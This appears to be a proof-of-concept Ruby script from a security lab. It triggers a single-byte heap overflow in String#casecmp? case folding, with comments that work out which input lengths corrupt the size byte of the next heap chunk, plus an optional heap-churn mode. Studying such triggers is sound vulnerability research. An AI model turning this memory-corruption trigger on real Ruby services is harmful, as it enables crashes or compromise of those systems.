# W363: argument-side String#casecmp? entry into the single-byte case_map
# overflow, modelling the request-shaped call known.casecmp?(user_input).
# str_casecmp_p (string.c:4353-4376) folds the receiver first, then the
# argument, so the ISO-8859-1 sharp-s operand here is folded second.
# "a" + N x 0xDF gives capa = N+21; R = capa+24 = N+45 = 72/88/104 at
# N=27/43/59, i.e. the successor chunk's size LSB. N=28 is the even-capa
# control (no header-slot write). The receiver is ASCII with the same
# folded byte length (1+2N); 'mismatch' changes only its first byte.
# Run: lab/build/plain/ruby-3.4.12-plain/bin/ruby <this> 27 match [churn]
n = (ARGV[0] || 27).to_i
mode = ARGV[1] || 'match'
other = ((mode == 'mismatch' ? "b" : "a") + "s" * (2 * n)).b
s = ("a".b + "\xDF".b * n)
s.force_encoding(Encoding::ISO_8859_1)
result = other.casecmp?(s)
print "N=#{n} casecmp-arg #{mode} result=#{result}\n"
if ARGV[2] == 'churn'
  3000.times { (Array.new(200) { "payload#{object_id}" }).join }
  a = []
  500.times { a << ("x" * 64) }
  GC.start
  print "N=#{n} casecmp-arg #{mode} churn ok\n"
end
